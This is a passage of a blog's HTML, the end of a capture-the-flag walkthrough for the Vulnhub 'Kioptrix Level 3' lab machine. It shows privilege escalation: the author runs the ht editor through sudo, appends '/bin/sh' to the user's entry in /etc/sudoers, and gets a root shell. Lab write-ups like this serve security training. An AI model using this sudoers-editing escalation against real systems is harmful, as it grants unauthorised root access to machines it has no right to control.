+        data-srcset="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2011.png, /es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2011.png 1.5x, /es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2011.png 2x"
+        data-sizes="auto"
+        alt="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2011.png"
+        title="Untitled" width="843" height="166" /></p>
+<p>With sudo -l we see that we have permissions to run it.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2012.png"
+        data-srcset="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2012.png, /es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2012.png 1.5x, /es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2012.png 2x"
+        data-sizes="auto"
+        alt="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2012.png"
+        title="Untitled" width="494" height="66" /></p>
+<p>if we execute it at first we will get an error so we have to execute the following:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2013.png"
+        data-srcset="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2013.png, /es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2013.png 1.5x, /es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2013.png 2x"
+        data-sizes="auto"
+        alt="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2013.png"
+        title="Untitled" width="534" height="128" /></p>
+<p>And run it:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo ht</span></span></code></pre></div></div>
+<p>To open a file, use the ALT+ F keys and select the open field:
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2014.png"
+        data-srcset="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2014.png, /es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2014.png 1.5x, /es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2014.png 2x"
+        data-sizes="auto"
+        alt="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2014.png"
+        title="Untitled" width="442" height="208" /></p>
+<p>We are going to edit the file /etc/sudoers to be able to launch a shell as root and thus escalate privileges.</p>
+<p>To do this, type /etc/sudoers and hit enter.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2015.png"
+        data-srcset="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2015.png, /es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2015.png 1.5x, /es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2015.png 2x"
+        data-sizes="auto"
+        alt="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2015.png"
+        title="Untitled" width="530" height="351" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2016.png"
+        data-srcset="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2016.png, /es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2016.png 1.5x, /es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2016.png 2x"
+        data-sizes="auto"
+        alt="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2016.png"
+        title="Untitled" width="601" height="484" /></p>
+<p>We add the following command followed by the existing commands to the user loneferret so that he can execute it with sudo.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">, bin/sh</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2017.png"
+        data-srcset="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2017.png, /es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2017.png 1.5x, /es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2017.png 2x"
+        data-sizes="auto"
+        alt="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2017.png"
+        title="Untitled" width="614" height="479" /></p>
+<p>Press ALT + F to save and exit.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2018.png"
+        data-srcset="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2018.png, /es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2018.png 1.5x, /es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2018.png 2x"
+        data-sizes="auto"
+        alt="/es/kioptrix_level_3/Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2018.png"
+        title="Untitled" width="631" height="524" /></p>
+<p>We get a shell as root:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">loneferret@Kioptrix3:~$ sudo sh
+</span></span><span class="line"><span class="cl"><span class="c1"># whoami</span>
+</span></span><span class="line"><span class="cl">root</span></span></code></pre></div></div>
+<p>Happy Hacking :)</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-08-25</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/en/kioptrix_level_3/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="http://localhost:1313/en/kioptrix_level_3/" data-title="Kioptrix Level 3 Walkthrough" data-hashtags="Walkthrough,Vulnhub,TjNull,OSCP,Easy"><i class="fab fa-x-twitter" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Threads" data-sharer="threads" data-url="http://localhost:1313/en/kioptrix_level_3/" data-title="Kioptrix Level 3 Walkthrough"><i class="fab fa-threads" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://localhost:1313/en/kioptrix_level_3/" data-hashtag="Walkthrough"><i class="fab fa-facebook-square" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="http://localhost:1313/en/kioptrix_level_3/"><i class="fab fa-linkedin" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/en/kioptrix_level_3/" data-title="Kioptrix Level 3 Walkthrough"><i class="fab fa-hacker-news" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://localhost:1313/en/kioptrix_level_3/" data-title="Kioptrix Level 3 Walkthrough"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://localhost:1313/en/kioptrix_level_3/" data-title="Kioptrix Level 3 Walkthrough"><i class="fab fa-weibo" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Diaspora" data-sharer="diaspora" data-url="http://localhost:1313/en/kioptrix_level_3/" data-title="Kioptrix Level 3 Walkthrough" data-description=""><i class="fab fa-diaspora" aria-hidden="true"></i></a><a href="https://t.me/share/url?url=http%3a%2f%2flocalhost%3a1313%2fen%2fkioptrix_level_3%2f&amp;text=Kioptrix%20Level%203%20Walkthrough" target="_blank" title="Share on Telegram"><i class="fab fa-telegram" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags" aria-hidden="true"></i>&nbsp;<a href="/en/tags/walkthrough/">Walkthrough</a>,&nbsp;<a href="/en/tags/vulnhub/">Vulnhub</a>,&nbsp;<a href="/en/tags/tjnull/">TjNull</a>,&nbsp;<a href="/en/tags/oscp/">OSCP</a>,&nbsp;<a href="/en/tags/easy/">Easy</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/en/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/en/kioptrix_level_2/" class="prev" rel="prev" title="Kioptrix Level 2 Walkthrough"><i class="fas fa-angle-left" aria-hidden="true"></i>Kioptrix Level 2 Walkthrough</a>
+            <a href="/en/kioptrix_level_5/" class="next" rel="next" title="Kioptrix Level 5 Walkthrough">Kioptrix Level 5 Walkthrough<i class="fas fa-angle-right" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.157.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 1.0.0"><i class="far fa-kiss-wink-heart" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2026</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/en/" target="_blank">AnTuSec</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><script src="/lib/autocomplete/autocomplete.min.js"></script><script src="/lib/algoliasearch/lite/browser.umd.js"></script><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/lightgallery/lightgallery.min.js"></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script>window.config={"comment":{},"lightgallery":true,"search":{"algoliaAppID":"4D1IDY8JU6","algoliaIndex":"index","algoliaSearchKey":"05332ac5ed76655a511f0da583a9afac","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"}};</script><script src="/js/theme.js"></script></body>
+</html>
